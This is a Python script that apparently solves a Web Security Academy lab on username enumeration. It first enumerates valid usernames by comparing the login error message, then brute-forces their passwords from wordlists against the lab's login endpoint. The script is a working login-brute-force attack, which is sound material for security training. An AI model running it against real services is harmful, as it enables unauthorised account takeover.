# /// script
# requires-python = ">=3.14"
# dependencies = [
#     "dotenv>=0.9.9",
#     "pandas>=3.0.0",
#     "requests>=2.32.5",
# ]
# ///

'''
Note:
    - It's also possible to brute-force the login using a single cluster bomb attack. However, it's generally much more efficient to enumerate a valid username first if possible.
'''

import os
import logging
import requests
import pandas as pd
from dotenv import load_dotenv

load_dotenv()

# Endpoint URL
URL = 'https://0abb00d8035689038174118d006e0089.web-security-academy.net/login'

# Named constants for response lengths observed during analysis
NON_VALID_USER_RESPONSE = "Invalid username or password."
NON_VALID_USER_RESPONSE_PASSWORD = "Invalid username or password"

# Configure basic logging
logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')

# -------------------------------------------------------------------------------------------------------------------------

def lab_already_solved() -> bool:
    '''
    Check if the lab is already solved by sending a request and checking for sentence "Congratulations, you solved the lab!".

    :return: True if the lab is already solved, False otherwise
        :rtype: bool
    '''

    try:
        response = requests.get(URL)

        if (response.status_code == 200) and ('Congratulations, you solved the lab!' in response.text):
            return True
        else:
            return False

    except requests.RequestException as e:
        logging.error(f'Error checking lab status: {e}')
        return False
    


def import_data(filename: str, column_name: str = 'value') -> list[str]:
    '''
    Read a CSV file without headers into a DataFrame and return unique values from the first column as a list of strings.

    :param filename: Path to the CSV file
        :type filename: str
    :param column_name: Name to assign to the first column (default: 'value')
        :type column_name: str

    :return: List of unique values from the CSV
        :rtype: list[str]

    :raises FileNotFoundError: If the file does not exist
    :raises pd.errors.ParserError: If pandas cannot parse the file
    '''

    try:
        df = pd.read_csv(filename, header=None, names=[column_name])

    except FileNotFoundError:
        logging.error(f'File not found: {filename}')
        raise
    
    data = df[column_name].astype(str).unique().tolist()

    logging.info(f'Data imported from {filename}: {len(data)} unique values')

    return data


def bruteforce_usernames(usernames: list[str], URL: str) -> list[str]:
    '''
    Enumerate valid usernames by sending POST requests with a fixed password and detecting deviations in the response length observed for invalid users.

    :param usernames: List of usernames to test
        :type usernames: list[str]
    :param URL: The URL to send the POST request to
        :type URL: str

    :return: A list of valid usernames
        :rtype: list[str]
    '''

    # Observed behaviour in Burp Suite: invalid username responses are consistently
    # NON_VALID_USER_RESPONSE "Invalid username or password." with HTTP 200
    valid_users: list[str] = []

    for username in usernames:

        # Using a constant password for enumeration since we're only interested in response differences for valid vs invalid usernames
        payload = {'username': username, 'password': 'test'}

        response = requests.post(URL, data=payload)

        logging.info(f'Testing username: {username} -> HTTP {response.status_code}, response length {len(response.text)}')

        if (response.status_code == 200) and (NON_VALID_USER_RESPONSE not in response.text):
            valid_users.append(username)
            logging.info(f'[+] Username found: {username} -> HTTP {response.status_code}, response length {len(response.text)}')

    return valid_users



def bruteforce_passwords(usernames: list[str], passwords: list[str], URL: str) -> dict[str, str]:
    '''
    Attempt to brute-force passwords for given usernames by trying each password and detecting successful logins via response-length differences.

    :param usernames: List of usernames to test
        :type usernames: list[str]
    :param passwords: List of passwords to test
        :type passwords: list[str]
    :param URL: The URL to send the POST request to
        :type URL: str

    :return: A dictionary mapping username -> valid password
        :rtype: dict[str, str]
    '''

    # Observed behaviour: invalid password responses are consistently
    # NON_VALID_PASSWORD_RESPONSE_LENGTH
    valid_credentials: dict[str, str] = {}

    for username in usernames:
        for password in passwords:
            payload = {'username': username, 'password': password}

            response = requests.post(URL, data=payload)

            logging.info(f'Testing credentials: {username}:{password} -> HTTP {response.status_code}, response length {len(response.text)}')

            if (response.status_code == 200) and (NON_VALID_USER_RESPONSE_PASSWORD not in response.text):
                valid_credentials[username] = password
                logging.info(f'[+] Valid credentials: {username}:{password} -> HTTP {response.status_code}, response length {len(response.text)}')
                
                # Stop testing passwords for this username after the first valid password is found (if any)
                break

    return valid_credentials


def main() -> None:

    logging.info('Lab: Username enumeration via different responses')

    if lab_already_solved():
        logging.info('Lab is already solved. Exiting.')
        exit(0)

    # Data directory (recommended to set DATA_DIR in .env); fallback to current dir
    data_dir = os.getenv('DATA_DIR', '.')

    # Files with data
    usernames_file = os.path.join(data_dir, 'usernames.txt')
    passwords_file = os.path.join(data_dir, 'passwords.txt')

    # Import data
    usernames = import_data(usernames_file)
    passwords = import_data(passwords_file)

    # Validate Users
    valid_users = bruteforce_usernames(usernames, URL)

    # Validate Credentials
    valid_credentials = bruteforce_passwords(valid_users, passwords, URL)

    for key, value in valid_credentials.items():
        logging.info('[+] Valid credentials discovered: %s:%s', key, value)


if __name__ == "__main__":
    main()


